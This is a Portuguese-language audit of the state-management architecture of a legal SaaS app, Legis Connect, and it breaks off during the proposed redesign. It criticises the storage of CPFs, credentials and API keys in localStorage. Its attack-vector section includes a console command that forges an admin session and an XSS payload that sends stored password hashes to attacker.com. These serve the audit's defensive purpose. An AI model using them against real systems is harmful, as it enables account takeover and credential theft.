# 🗂️ STATE MANAGEMENT ARCHITECTURE BLUEPRINT — LEGIS CONNECT
**PROMPT 003 — Auditoria Completa da Camada de Estado Global**
**Arquiteto Frontend Enterprise | State Management Specialist | 25/07/2026 | v1.0.0**

---

## SUMÁRIO EXECUTIVO

A arquitetura de estado da Legis Connect é o **núcleo de todos os problemas técnicos identificados** nos Prompts 001 e 002. Toda a segurança comprometida, a incapacidade de ser multiusuário e os riscos de LGPD emanam diretamente da decisão arquitetural de centralizar o estado da aplicação no `localStorage` do navegador.

**Diagnóstico Central**: A plataforma utiliza dois Context Providers + `useState` local no `App.tsx` como única camada de estado. Não há distinção entre **UI State**, **Client State** e **Server State**. Dados de advogados, clientes, CPFs e credenciais coexistem no mesmo barramento com estados de modal aberto e tab selecionada — um antipadrão grave em aplicações SaaS.

---

## ETAPA 1 — INVENTÁRIO DOS SISTEMAS DE ESTADO

### 1.1 Mapa Completo de Todos os Estados

| Estado | Localização | Tipo | Scope | Persistência | Consumido por | Risco |
|---|---|---|---|---|---|---|
| `currentView` | App.tsx `useState` | UI State | App global | `localStorage.legis_currentView` | App.tsx (roteador) | 🟡 Médio |
| `user` | App.tsx `useState` | Auth State | App global | `localStorage.legis_user` | App.tsx, todos dashboards | 🔴 Crítico |
| `searchResults` | App.tsx `useState` | UI State | Temporário | Nenhuma | LawyerSearch | 🟢 OK |
| `selectedLawyer` | App.tsx `useState` | UI State | Temporário | Nenhuma | LawyerProfile | 🟢 OK |
| `mapsResult` | App.tsx `useState` | UI State | Temporário | Nenhuma | LawyerSearch | 🟢 OK |
| `isChatbotOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | ChatbotFab, ChatbotModal | 🟢 OK |
| `chatHistory` | App.tsx `useState` | Client State | Temporário | Nenhuma (perdido ao fechar) | ChatbotModal | 🟡 Médio |
| `isChatbotLoading` | App.tsx `useState` | UI State | Temporário | Nenhuma | ChatbotModal | 🟢 OK |
| `isTermsModalOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | TermsOfServiceModal | 🟢 OK |
| `isPrivacyModalOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | PrivacyPolicyModal | 🟢 OK |
| `isEticaModalOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | EticaOABModal | 🟢 OK |
| `isLoginModalOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | LoginModal | 🟢 OK |
| `isProfileSelectorOpen` | App.tsx `useState` | UI State | Temporário | Nenhuma | ProfileSelectorModal | 🟢 OK |
| `loginPendingAction` | App.tsx `useState` | UI State | Temporário | Nenhuma | App.tsx | 🟢 OK |
| `config` (AppConfig) | AppContext `useState` | Config State | App global | `localStorage.legis_app_config` | Header, Footer, SettingsTab | 🔴 Alto |
| `lawyers` | AppDataContext `useState` | Server State | App global | `localStorage.legis_lawyers` | LawyerSearch, AdminDashboard | 🔴 Crítico |
| `clients` | AppDataContext `useState` | Server State | App global | `localStorage.legis_clients` | AdminDashboard, RegistrationsTab | 🔴 Crítico |
| `interns` | AppDataContext `useState` | Server State | App global | `localStorage.legis_interns` | AdminDashboard, LawyerDashboard | 🔴 Crítico |
| `secretaries` | AppDataContext `useState` | Server State | App global | `localStorage.legis_secretaries` | AdminDashboard | 🔴 Crítico |
| `services` | AppDataContext `useState` | Server State | App global | `localStorage.legis_services` | EfficiencyServicesPage, Admin | 🟡 Médio |
| `serviceGroups` | AppDataContext `useState` | Server State | App global | `localStorage.legis_serviceGroups` | EfficiencyServicesPage | 🟡 Médio |
| `toasts` | Toast.tsx `useState` | UI State | Temporário | Nenhuma | Qualquer componente | 🟢 OK |
| Staff (legis_platform_staff) | staffService (localStorage) | Server State | Serviço | `localStorage.legis_platform_staff` | SettingsTab, StaffManagementTab | 🔴 Crítico |
| Audit Log | auditLogger (localStorage) | Server State | Serviço | `localStorage.legis_audit_log` | SettingsTab (AuditLogViewer) | 🔴 Crítico |
| Financial Tx | dbService (localStorage) | Server State | Serviço | `localStorage.legis_financial_tx` | FinanceTab | 🔴 Crítico |
| Admin Users | dbService (localStorage) | Auth State | Serviço | `localStorage.legis_admin_users` | App.tsx (handleLogin) | 🔴 Crítico |
| Provisioning | provisioningService (localStorage) | Server State | Serviço | `localStorage.legis_service_provisionings` | AdminDashboard, EfficiencyServicesPage | 🔴 Alto |
| Received Docs | dbService (localStorage) | Server State | Serviço | `localStorage.legis_received_docs` | LawyerDashboard (DocumentReceiver) | 🔴 Crítico |
| Legal Docs | dbService (localStorage) | Server State | Serviço | `localStorage.legis_legal_docs` | LawyerDashboard | 🔴 Crítico |
| Legal Codes | dbService (localStorage) | Master Data | Serviço | `localStorage.legis_legal_codes` | SettingsTab, LawyerDashboard | 🟡 Médio |

**Total de estados identificados**: 30
**Estados Server-side indevidamente no browser**: 17 (57%)
**Estados críticos sem proteção**: 12 (40%)

---

## ETAPA 2 — AUDITORIA DO AppContext

### 2.1 Análise Detalhada

**Arquivo**: `context/AppContext.tsx` (48 linhas — arquivo bem dimensionado)

```typescript
// O que o AppContext controla:
interface AppContextValue {
  config: AppConfig;                    ← Estado de configuração
  updateConfig: (changes) => void;      ← Método de mutação
  setLogoFromFile: (file, target) => void; ← Lógica de negócio (FileReader)
}

// AppConfig — o que está dentro:
interface AppConfig {
  appName: string;           ← Configuração de UI
  logoUrl: string | null;    ← Asset (base64!) no Context
  headerLogoUrl: string | null; ← Asset (base64!)
  footerLogoUrl: string | null; ← Asset (base64!)
  siteTagline: string;       ← Configuração de UI
  footerText: string;        ← Configuração de UI
  contactEmail?: string;     ← Dado de contato
  contactPhone?: string;     ← Dado de contato
  customFields?: [{...}];    ← Extensão de configuração
  dbType?: 'local' | 'cloud'; ← Dado técnico de infraestrutura
  dbCloudProvider?: 'firebase' | 'supabase'; ← Credencial técnica
  dbApiKey?: string;          ← 🔴 API KEY no Context!
  dbProjectUrl?: string;      ← URL de banco no Context
  dbAuthDomain?: string;      ← Credencial no Context
  updatedAt: string;          ← Metadado
}
```

### 2.2 Avaliação do AppContext

| Critério | Avaliação | Detalhe |
|---|---|---|
| **SRP (Single Responsibility)** | 🔴 Violado | Mistura configuração visual, credenciais de banco e lógica de FileReader |
| **Volume de dados** | 🔴 Problemático | Logos como base64 dentro do Context = objetos de >1MB no estado React |
| **Dados sensíveis** | 🔴 Crítico | `dbApiKey` e `dbProjectUrl` armazenados em Context → localStorage → plaintext |
| **Performance** | 🔴 Problemático | Logo base64 no Context causa re-render de TODA a subárvore ao trocar logo |
| **Testabilidade** | 🟡 Médio | Lógica do FileReader dentro do hook (`setLogoFromFile`) é difícil de testar |
| **Tamanho do arquivo** | 🟢 Bom | 48 linhas — bem dimensionado |

### 2.3 Responsabilidades que Devem ser Separadas

```
AppContext atual (tudo misturado):
  config.appName + tagline + footerText  ← Branding UI Config
  config.logoUrl (base64)                ← Asset Storage
  config.dbApiKey + dbProjectUrl         ← Infraestrutura sensível
  config.contactEmail + contactPhone     ← Configuração pública
  setLogoFromFile (FileReader)           ← Lógica de negócio

↓ Proposta de separação:

BrandingContext        ← appName, siteTagline, footerText, contactEmail
AssetContext           ← logoUrl (referência de URL, não base64)
InfrastructureConfig   ← dbType, dbProvider (apenas server-side — NUNCA no frontend)
```

### 2.4 Proposta de Decomposição

```typescript
// contexts/BrandingContext.tsx
// Apenas configurações visuais textuais
interface BrandingConfig {
  appName: string;
  siteTagline: string;
  footerText: string;
  contactEmail: string;
  contactPhone: string;
  logoUrl: string; // URL de CDN — nunca base64 diretamente no Context
}

// contexts/FeatureFlagsContext.tsx
// Flags de features do plano contratado
interface FeatureFlags {
  hasAiTools: boolean;
  hasVideoConsultation: boolean;
  hasDocumentManagement: boolean;
}

// ❌ dbApiKey, dbProjectUrl → REMOVIDOS do frontend
// Devem estar apenas em variáveis de ambiente do servidor NestJS
```

---

## ETAPA 3 — AUDITORIA DO AppDataContext

### 3.1 Análise Detalhada

**Arquivo**: `context/AppDataContext.tsx` (213 linhas)

```typescript
// O que o AppDataContext controla — 6 entidades + 11 mutações:
interface AppDataContextValue {
  // Estados (Server State indevidamente no browser)
  lawyers:       Lawyer[];              ← Lista completa de advogados
  clients:       MockClient[];          ← Lista completa de clientes (PII)
  interns:       MockIntern[];          ← Lista completa de estagiários (PII)
  secretaries:   MockSecretary[];       ← Lista completa de secretárias (PII)
  services:      EfficiencyService[];   ← Catálogo de serviços
  serviceGroups: EfficiencyServiceGroup[]; ← Grupos de serviços

  // Mutações (11 funções)
  updateLawyer, addLawyer, setLawyers   ← 3 mutations para Lawyer
  updateClient                           ← 1 mutation para Client
  updateIntern                           ← 1 mutation para Intern
  updateSecretary                        ← 1 mutation para Secretary
  updateServices, updateServiceGroups   ← 2 mutations para Services
}
```

### 3.2 Mapa Hierárquico do AppDataContext

```
AppDataContext
│
├── lawyers: Lawyer[]          (6 registros mock → escala para milhares)
│    ├── id, name, oab, photo
│    ├── contact.email, phone  ← PII
│    ├── address               ← PII
│    ├── specializations[]
│    ├── rating, reviews[]
│    └── appointments[]        ← Dado de negócio
│
├── clients: MockClient[]      (registros mock → PII completa)
│    ├── id, name, cpf         ← CPF em Context!
│    ├── email, phone          ← PII
│    ├── address               ← PII
│    └── caseHistory[]         ← Dado jurídico sensível
│
├── interns: MockIntern[]      (PII de estagiários)
│    ├── id, name, cpf         ← CPF em Context!
│    ├── universidade, curso   ← Dado acadêmico
│    └── contact               ← PII
│
├── secretaries: MockSecretary[]
│    ├── id, name, cpf         ← CPF em Context!
│    └── contact               ← PII
│
├── services: EfficiencyService[]
│    ├── id, name, price
│    ├── discount, category
│    └── features[]
│
└── serviceGroups: EfficiencyServiceGroup[]
     ├── id, name
     └── description
```

### 3.3 Problemas Críticos do AppDataContext

| Problema | Impacto | Código-Fonte |
|---|---|---|
| **God Context** — 6 entidades em 1 Context | Re-render de toda a subárvore ao atualizar qualquer entidade | L62–87 |
| **CPF em memória React** | CPF de todos os clientes/estagiários/secretárias acessível via DevTools React | L97–110 |
| **Volume crescente** — sem paginação | Com 10.000 advogados, o Context armazenará todo o JSON na memória | L94–111 |
| **StorageEvent parcial** — apenas lawyers, services e serviceGroups | Atualização de clients/interns/secretaries em outra aba não propaga | L114–128 |
| **Sem invalidação** — estado nunca fica "stale" | Dados desatualizados permanecem em memória indefinidamente | Global |
| **Sem loading/error state** — apenas dados ou fallback | Impossível diferenciar "carregando" de "sem dados" | Global |
| **Sem otimistic updates** | Mutações bloqueantes — UI trava durante operações assíncronas futuras | L131–188 |
| **addLawyer com deduplicação** por id | Comportamento correto mas frágil sem validação server-side | L139–146 |

### 3.4 Sincronização Cross-Tab — Bug Crítico

```typescript
// CÓDIGO ATUAL — AppDataContext.tsx L115–128
const onStorage = (e: StorageEvent) => {
  if (e.key === KEYS.lawyers && e.newValue) {    // ← Sincroniza
    setLawyersState(JSON.parse(e.newValue));
  }
  if (e.key === KEYS.services && e.newValue) {   // ← Sincroniza
    setServicesState(JSON.parse(e.newValue));
  }
  if (e.key === KEYS.serviceGroups && e.newValue) { // ← Sincroniza
    setServiceGroupsState(JSON.parse(e.newValue));
  }
  // ❌ CLIENTS, INTERNS, SECRETARIES NÃO SINCRONIZAM ENTRE ABAS
};
```

**Consequência**: Um admin que edita dados de clientes em uma aba não verá as mudanças em outra aba aberta simultaneamente.

---

## ETAPA 4 — MAPEAMENTO DO FLUXO DE DADOS

### 4.1 Fluxo: Cadastro de Advogado (AS-IS)

```
Usuário preenche LawyerSignupForm (22KB)
         │
         ▼
Validação manual no componente (sem Zod)
         │
         ▼ [onSignup callback]
App.tsx: handleLawyerSignup(data: LawyerSignupData)
         │
         ▼
Constrói objeto Lawyer{} em memória (id = Date.now())
         │
         ▼
addLawyer(lawyer) → AppDataContext
         │
         ▼
setLawyersState(prev => [...prev, lawyer])   ← Estado React atualizado
         │
         ▼
saveToStorage('legis_lawyers', next)          ← localStorage.setItem()
         │
         ▼
Re-renderização de todos consumidores do AppDataContext
         │
         ▼
AuditLogger.log('LAWYER_REGISTERED')          ← Log em localStorage
         │
         ▼
handleNavigate('lawyerDashboard')             ← Mudança de view

PROBLEMAS:
  ❌ id gerado por Date.now() — colisão possível; não é UUID
  ❌ Sem verificação de OAB na OAB real
  ❌ Dados em localStorage — perdidos ao limpar o navegador
  ❌ Nenhuma notificação ao admin (sem email, sem push)
  ❌ Re-render de toda a árvore sem separação de contextos
```

### 4.2 Fluxo: Login (AS-IS)

```
Usuário preenche email + senha
         │
         ▼
App.tsx: handleLogin({ email, password })
         │
         ▼
localStorage.getItem('legis_admin_users')        ← Lê todos os admins
         │
         ├─── Admin encontrado?
         │         │
         │         ▼
         │    hashPassword(password)               ← btoa reversível
         │         │
         │         ▼
         │    Comparação local: stored === hashed  ← Auth client-side
         │         │
         │         ▼
         │    setUser({ role: 'admin' })
         │         │
         │         ▼
         │    localStorage.setItem('legis_user')   ← Sessão sem JWT
         │         │
         │         ▼
         │    handleNavigate('adminDashboard')
         │
         ├─── Advogado? → busca em AppDataContext.lawyers[] (em memória)
         │         │
         │         ▼
         │    Dummy password check: if (password) → qualquer senha funciona
         │
         └─── Cliente? → Dummy check: if (password) → qualquer senha funciona
                   │
                   ▼
              mockCases e mockAppointments hardcoded retornados

VULNERABILIDADES CRÍTICAS:
  🔴 Qualquer senha autentica como advogado ou cliente
  🔴 Admin auth 100% client-side
  🔴 Sessão sem expiração, sem JWT
  🔴 DevTools: localStorage.setItem('legis_user', '{"role":"admin"}') → bypass total
```

### 4.3 Fluxo: Atualização Financeira (AS-IS)

```
Admin cria transação em FinanceTab
         │
         ▼
dbFinancial.add(transaction)                     ← dbService.ts
         │
         ▼
load('legis_financial_tx', [])                   ← localStorage.getItem
         │
         ▼
[...existing, transaction]                        ← Merge em memória
         │
         ▼
save('legis_financial_tx', updated)              ← localStorage.setItem
         │
         ▼ [PROBLEMA: FinanceTab não consome AppDataContext]
FinanceTab re-lê localStorage diretamente        ← Desacoplado do React state!

PROBLEMAS:
  ❌ dbService não integra com React state — mudanças não causam re-render
  ❌ Sem gateway de pagamento — nenhuma receita real
  ❌ Sem ACID — dados podem ficar inconsistentes se o tab fechar durante write
  ❌ Sem auditoria financeira imutável — pode ser apagado via DevTools
```

### 4.4 Fluxo: Atualização de Auditoria (AS-IS)

```
Qualquer ação administrativa ocorre
         │
         ▼
AuditLogger.log({ action, actorId, targetId, details, severity })
         │
         ▼
Lê localStorage.getItem('legis_audit_log')       ← Todos os logs em memória
         │
         ▼
Calcula hash: btoa(prevEntry.hash + JSON.stringify(entry))  ← btoa ≠ SHA-256
         │
         ▼
Adiciona entrada no array (máximo 5.000)          ← Trunca logs mais antigos!
         │
         ▼
localStorage.setItem('legis_audit_log', JSON.stringify)
         │
         ▼
[Log vulnerável] Desenvolvedor abre DevTools → apaga todas as entradas

PROBLEMAS GRAVÍSSIMOS:
  🔴 Log de auditoria sem validade jurídica — adulterável
  🔴 Hash com btoa ≠ SHA-256 — hash chain trivialmente forjável
  🔴 Truncamento de 5.000 entradas — logs antigos perdidos
  🔴 Sem persistência server-side — log não existe para nenhum outro usuário
```

### 4.5 Fluxo: Cadastro de Cliente (AS-IS)

```
Usuário preenche ClientSignupForm (13KB)
         │
         ▼
Sem validação de CPF (dígito verificador)
Sem validação de e-mail único
         │
         ▼
onSignup(data: ClientSignupData) → App.tsx
         │
         ▼
Constrói User{ role: 'client', name, phone, address }
         │
         ▼
setUser(clientUser)                              ← Estado React
         │
         ▼
localStorage.setItem('legis_user')               ← Sessão imediata (sem email verify)
         │
         ▼
handleNavigate('dashboard')

PROBLEMAS:
  ❌ CPF não validado matematicamente
  ❌ Sem verificação de e-mail (qualquer e-mail é aceito)
  ❌ Cliente não é adicionado a legis_clients — invisível para o admin!
  ❌ Dados do cliente persistem apenas para ele mesmo — sem banco compartilhado
  ❌ Perda total de dados ao limpar o navegador
```

---

## ETAPA 5 — ANÁLISE DE ACOPLAMENTO

### 5.1 Matriz de Acoplamento por Módulo

| Módulo | Depende de | Grau de Acoplamento | Problema | Solução |
|---|---|---|---|---|
| **LawyerDashboard** | mockInterns, mockSecretaries (importação direta de serviços), AppDataContext, dbService, 5 services | 🔴 EXTREMO | Importa dados de mock diretamente; acessa dbService diretamente | `useLawyerDashboardData()` hook que abstrai todos os acessos |
| **App.tsx (handleLogin)** | mockDataService (hashPassword), localStorage diretamente, AppDataContext, 10+ imports de componentes | 🔴 EXTREMO | Auth misturada com roteamento e renderização | `AuthContext` + `AuthService` isolado |
| **FinanceTab** | dbService (dbFinancial.getAll()), localStorage diretamente | 🟠 ALTO | Acessa localStorage sem passar por Context | `useFinancialData()` hook → React Query |
| **SettingsTab** | dbService, StaffService, AuditLogger, cryptoUtils, AppContext | 🟠 ALTO | Depende de 5 serviços diretamente | Hooks: `useAuditLog()`, `useSystemConfig()`, `useStaffCrud()` |
| **AdminDashboard** | AppDataContext, múltiplos tabs | 🟡 MÉDIO | Passa dados via props para tabs | Tabs acessam Context diretamente |
| **ClientDashboard** | AppDataContext (via LawyerSearch), mockLawyers diretamente | 🟡 MÉDIO | Fallback hardcoded `mockLawyers[0]` | `useClientDashboardData()` hook |
| **ProvisioningService** | localStorage diretamente, AuditLogger | 🟡 MÉDIO | Serviço de negócio com persistência local | `ProvisioningRepository` → API |
| **StaffService** | localStorage diretamente, AuditLogger, hashPassword | 🟡 MÉDIO | Bem estruturado mas persiste localmente | `StaffRepository` → API |
| **LawyerSearch** | geminiService (direto), mapsService (direto), AppDataContext | 🟠 ALTO | Chama APIs externas diretamente do componente | `useLawyerSearch()` hook com proxy NestJS |
| **AuditLogger** | localStorage diretamente, btoa (hash) | 🟡 MÉDIO | Design correto, implementação frágil | Stream → NestJS endpoint → SIEM |

### 5.2 Grafo de Dependências Circular

```
App.tsx
 ├── → AppDataContext (usa useAppData)
 │         └── → mockLawyerService (dados iniciais)
 │         └── → mockDataService (dados iniciais)
 │
 ├── → mockDataService (hashPassword)
 │         └── [hashPassword usado em] staffService
 │         └── [hashPassword usado em] App.tsx handleLogin
 │                                ↑ CICLO: App.tsx depende de mockDataService
 │                                         staffService também depende
 │
 └── → LawyerDashboard
           └── → mockInterns (mockDataService)   ← Acoplamento direto
           └── → mockSecretaries (mockDataService) ← Acoplamento direto
           └── → dbService (dbCodes)              ← Acoplamento direto
```

---

## ETAPA 6 — CLASSIFICAÇÃO GLOBAL STATE × LOCAL STATE × SERVER STATE

### 6.1 Classificação Atual vs. Correta

| Estado | Classificação Atual | Classificação Correta | Ação Necessária |
|---|---|---|---|
| `user` (sessão) | `localStorage` + `useState` App.tsx | **Auth State** → JWT httpOnly cookie | Mover para `AuthContext` + backend |
| `currentView` | `localStorage` + `useState` App.tsx | **UI State** → React Router URL | Substituir por React Router |
| `lawyers[]` | Context + localStorage | **Server State** → React Query | `useLawyers()` → GET /api/lawyers |
| `clients[]` | Context + localStorage | **Server State** → React Query | `useClients()` → GET /api/clients |
| `interns[]` | Context + localStorage | **Server State** → React Query | `useInterns()` → GET /api/interns |
| `secretaries[]` | Context + localStorage | **Server State** → React Query | `useSecretaries()` → GET /api/secretaries |
| `services[]` | Context + localStorage | **Server State** → React Query | `useServices()` → GET /api/services |
| `serviceGroups[]` | Context + localStorage | **Server State** → React Query | `useServiceGroups()` → GET /api/service-groups |
| `searchResults[]` | `useState` App.tsx | **UI State** → `useState` local | Mover para LawyerSearch component |
| `selectedLawyer` | `useState` App.tsx | **UI State** → `useState` ou URL param | Mover para LawyerSearch/Profile |
| `mapsResult` | `useState` App.tsx | **UI State** → `useState` local | Mover para LawyerSearch component |
| `chatHistory` | `useState` App.tsx | **Client State** → `useState` com sessão | Mover para `ChatbotContext` |
| `isChatbot*` | `useState` App.tsx | **UI State** → `useState` local | Mover para `ChatbotContext` |
| `is*ModalOpen` | `useState` App.tsx | **UI State** → `useState` local | Mover para `ModalContext` |
| `config` (branding) | AppContext + localStorage | **Config State** → `useState` + API | `BrandingContext` + GET /api/config |
| `config.dbApiKey` | AppContext + localStorage | **Server Secret** → NestJS env | NUNCA no frontend |
| Financial Tx | dbService (localStorage) | **Server State** → React Query | `useFinancialData()` → GET /api/finance |
| Audit Log | auditLogger (localStorage) | **Immutable Server State** → SIEM | POST /api/audit → CloudWatch |
| Staff data | staffService (localStorage) | **Server State** → React Query | `useStaff()` → GET /api/staff |
| Provisioning | provisioningService (localStorage) | **Server State** + Bull Queue | `useProvisioning()` → GET /api/provisioning |

### 6.2 Resumo da Classificação

```
UI State (deve permanecer local/Context):       7 estados
Client State (pode ser Context ou Zustand):     2 estados
Server State (deve ir para React Query):       15 estados
Auth State (JWT httpOnly cookie):               2 estados
Server Secrets (nunca no frontend):             3 itens

Total identificado: 29 estados + 3 secrets
```

---

## ETAPA 7 — AUDITORIA DE PERSISTÊNCIA DO ESTADO

### 7.1 Estratégia de Persistência — AS-IS

```
React State (memória)
       │
       ├── Mudança de estado (setter)
       │
       ▼
localStorage.setItem() ← Chamada síncrona bloqueante
       │
       ├── ✅ Funciona para 1 usuário, 1 dispositivo, 1 aba
       │
       ├── ❌ Limite de ~5–10MB por origem
       │
       ├── ❌ Síncrono — bloqueia a thread principal em listas grandes
       │
       ├── ❌ Sem transações — falha parcial deixa estado inconsistente
       │
       ├── ❌ Acessível a qualquer script da mesma origem
       │
       └── ❌ Invisível para outros usuários / dispositivos
```

### 7.2 Problemas Específicos de Persistência

| Problema | Detalhe | Impacto |
|---|---|---|
| **Dados duplicados** | `AppDataContext.clients` e `dbService.dbAdminUsers` são armazenados separadamente, mas nenhum é a fonte de verdade única | Inconsistência entre exibições |
| **Estado desatualizado** | Se a seed de `mockLawyers` mudar (nova versão do código), o localStorage ainda carrega os dados antigos | Bug silencioso em produção |
| **Falha entre abas** | `StorageEvent` não propaga para clients/interns/secretaries | Admin vê dados diferentes em abas diferentes |
| **Sem transações ACID** | Duas escritas simultâneas podem corromper o JSON | Dados corrompidos irrecuperáveis |
| **Perda de dados** | Usuário limpa cookies/histórico → todos os dados da plataforma são perdidos | Perda catastrófica de dados jurídicos |
| **Limite de storage** | Logo base64 no `legis_app_config` pode ocupar 2–5MB de um limite de 5–10MB | `QuotaExceededError` silencioso |
| **Sem recuperação** | Nenhum mecanismo de backup; sem retry após falha de write | `localStorage.setItem` falha silenciosamente (`try { } catch { /* ignore */ }`) |

### 7.3 Análise do `dbCloud` (Firebase/Supabase Stubs)

```typescript
// dbService.ts — O que existe (stubs implementados):
export const dbCloud = {
  testConnection(provider, apiKey, projectId),  ← Funcional (faz fetch real)
  saveDocument(collection, docId, data),        ← Funcional
  getDocument(collection, docId),               ← Funcional
  deleteDocument(collection, docId),            ← Funcional
  saveList(collection, list),                   ← Funcional (loop de saveDocument)
  getList(collection),                          ← Funcional
};

// PROBLEMA: dbCloud nunca é chamado de nenhum componente ou Context!
// O SettingsTab.tsx tem uma interface para configurar dbType = 'cloud',
// mas o AppDataContext usa APENAS localStorage (loadFromStorage / saveToStorage).
// O dbCloud é um stub completo mas DESCONECTADO do fluxo de dados real.

// RESULTADO: mesmo que o usuário configure Firebase no painel de settings,
// os dados continuam indo para localStorage.
```

---

## ETAPA 8 — ANÁLISE DE PERFORMANCE DO ESTADO

### 8.1 Re-renderizações Problemáticas

| Trigger | Componentes Afetados | Causa | Solução |
|---|---|---|---|
| `updateLawyer()` (qualquer advogado) | TODA a subárvore do AppDataContext | Context único com 6 entidades | Dividir em LawyersContext, ClientsContext, etc. |
| `setUser()` (login/logout) | TODA a subárvore do App.tsx | App.tsx é o root de toda a árvore | `AuthContext` com React.memo nos dashboards |
| `config.logoUrl` atualizado (base64) | Header + Footer + SettingsTab + todos consumidores do AppContext | Logo base64 gigante no estado | Armazenar URL de CDN, não base64 |
| `addToast()` | Apenas ToastProvider.children | ✅ Bem isolado | Manter como está |
| `updateServices()` | Todos consumidores do AppDataContext | Contexto monolítico | Dividir em ServicesContext |

### 8.2 Análise de Memoização Existente

```typescript
// AppDataContext.tsx — useCallback aplicado corretamente:
const updateLawyer = useCallback((updated: Lawyer) => { ... }, []);
const addLawyer    = useCallback((lawyer: Lawyer) => { ... }, []);
const setLawyers   = useCallback((newLawyers: Lawyer[]) => { ... }, []);
// ✅ Funções de mutação são estáveis (dependências vazias)

// AppContext.tsx — useCallback aplicado corretamente:
const updateConfig   = useCallback((changes) => { ... }, []);
const setLogoFromFile = useCallback((file, target) => { ... }, [updateConfig]);
// ✅ Correto

// AUSÊNCIAS de memoização (problemas):
// LawyerDashboard — não usa useMemo para filtros de processos (cálculo a cada render)
// FinanceTab — gráficos Recharts sem useMemo nos dados calculados
// RegistrationsTab — sem useMemo nos filtros de busca (re-filtra a cada keystroke)
```

### 8.3 Tamanho Estimado do Estado em Memória

| Estado | Estimativa por registro | Total (1.000 registros) | Impacto |
|---|---|---|---|
| `lawyers[]` | ~2 KB (com foto URL, especialidades, reviews) | ~2 MB | 🟠 Alto |
| `clients[]` | ~0.5 KB (nome, CPF, histórico básico) | ~500 KB | 🟡 Médio |
| `interns[]` | ~0.3 KB | ~300 KB | 🟢 OK |
| `secretaries[]` | ~0.3 KB | ~300 KB | 🟢 OK |
| `services[]` | ~0.5 KB | ~500 KB | 🟡 Médio |
| `legis_app_config` (com logos base64) | ~2–5 MB (logo) | N/A | 🔴 Crítico |
| `legis_audit_log` (5.000 entradas max) | ~0.5 KB/entrada | ~2.5 MB | 🔴 Crítico |
| **Total estimado (produção com 1.000 advogados)** | | **~8–10 MB** | 🔴 **Excede limite do localStorage** |

---

## ETAPA 9 — SEGURANÇA DO GERENCIAMENTO DE ESTADO

### 9.1 Matriz de Segurança do Estado

| Dado | Local Atual | Acessível via | Risco | Destino Seguro |
|---|---|---|---|---|
| **CPF (clientes)** | `localStorage.legis_clients` + AppDataContext | DevTools → Application → Storage | 🔴 CRÍTICO — LGPD Art. 46 | PostgreSQL criptografado (AES-256 column) |
| **CPF (estagiários)** | `localStorage.legis_interns` + AppDataContext | DevTools → Application → Storage | 🔴 CRÍTICO | PostgreSQL criptografado |
| **Senha (hash btoa)** | `localStorage.legis_admin_users` | DevTools → Application → Storage | 🔴 CRÍTICO — reversível em ms | bcrypt + PostgreSQL server-side |
| **Credenciais staff** | `localStorage.legis_platform_staff` | DevTools → Application → Storage | 🔴 CRÍTICO | bcrypt + PostgreSQL server-side |
| **Sessão de usuário** | `localStorage.legis_user` | DevTools + XSS + extensões | 🔴 CRÍTICO | JWT httpOnly cookie + SameSite=Strict |
| **dbApiKey (Firebase)** | `localStorage.legis_app_config` | DevTools + XSS | 🔴 CRÍTICO | NestJS env vars — nunca no browser |
| **Documentos jurídicos** | `localStorage.legis_received_docs` (base64) | DevTools Application | 🔴 CRÍTICO — sigilo profissional | S3 com presigned URLs + servidor |
| **Histórico de casos** | AppDataContext.clients[].caseHistory | DevTools → React DevTools | 🔴 ALTO | PostgreSQL + ACL por advogado/cliente |
| **Transações financeiras** | `localStorage.legis_financial_tx` | DevTools Application | 🔴 ALTO | PostgreSQL + criptografia |
| **Chave AES-GCM** | `sessionStorage.legis_ek` | DevTools + extensões | 🔴 CRÍTICO | KMS (AWS Key Vault) — nunca no browser |
| **Log de auditoria** | `localStorage.legis_audit_log` | DevTools — pode ser apagado | 🔴 CRÍTICO | Append-only server (CloudWatch/Datadog) |

### 9.2 Vetores de Ataque ao Estado

```
Vetor 1: DevTools Console
  localStorage.setItem('legis_user', JSON.stringify({role:'admin',email:'x@x.com',name:'Hacker'}))
  → Acesso total ao painel administrativo sem senha
  → MITIGAÇÃO: JWT httpOnly cookie verificado pelo servidor em cada request

Vetor 2: Extensão Maliciosa de Browser
  extension.js: const data = JSON.parse(localStorage.getItem('legis_clients'))
  → CPF + endereço + histórico de todos os clientes exfiltrado
  → MITIGAÇÃO: Dados no servidor. Browser não armazena PII.

Vetor 3: XSS (se houver)
  <script>fetch('https://attacker.com?data=' + encodeURIComponent(localStorage.getItem('legis_admin_users')))</script>
  → Todos os hashes de senha exfiltrados
  → MITIGAÇÃO: CSP + httpOnly cookie (inacessível ao JavaScript)

Vetor 4: Acesso Físico ao Dispositivo
  Outro usuário abre o browser → F12 → DevTools
  → Dados de todos os usuários que usaram este browser visíveis
  → MITIGAÇÃO: Dados no servidor + sessão com TTL curto

Vetor 5: localStorage.clear() acidental
  Usuário limpa dados do browser → todos os dados jurídicos perdidos
  → MITIGAÇÃO: Backend como fonte de verdade
```

---

## ETAPA 10 — AVALIAÇÃO DA ARQUITETURA ATUAL

### 10.1 Scorecard de Gerenciamento de Estado

| Critério | Nota 0–100 | Justificativa |
|---|---|---|
| **Organização do Estado** | 40 | Separação em 2 Contexts é boa; mas monolíticos e misturados com Server State |
| **Escalabilidade** | 5 | 1 usuário/device; 5–10MB limit; sem paginação; sem cache distribuído |
| **Performance** | 30 | Context monolítico causa re-renders desnecessários; logos base64 em memória |
| **Segurança** | 10 | PII/CPF/credenciais em localStorage sem proteção; auth client-side |
| **Manutenção** | 45 | AppDataContext (213L) bem documentado; mas responsabilidade excessiva |
| **Testabilidade** | 15 | Context com efeito colateral (localStorage); impossível testar em isolamento sem mocks globais |
| **Sincronização** | 20 | StorageEvent parcial (3 de 6 entidades); sem WebSocket; sem invalidação |
| **Compliance LGPD** | 8 | CPF e dados sensíveis em plaintext no browser; logs adulteráveis |
| **MÉDIA GERAL** | **22** | **Inaceitável para plataforma jurídica em produção** |

---

## ETAPA 11 — NOVA ARQUITETURA DE ESTADO PROPOSTA

### 11.1 Modelo de Três Camadas

```
┌──────────────────────────────────────────────────────────────┐
│                    ESTADO DA APLICAÇÃO (TO-BE)               │
│                                                              │
│  ┌──────────────┐   ┌──────────────────┐   ┌─────────────┐ │
│  │  UI State    │   │   Server State   │   │ Auth State  │ │
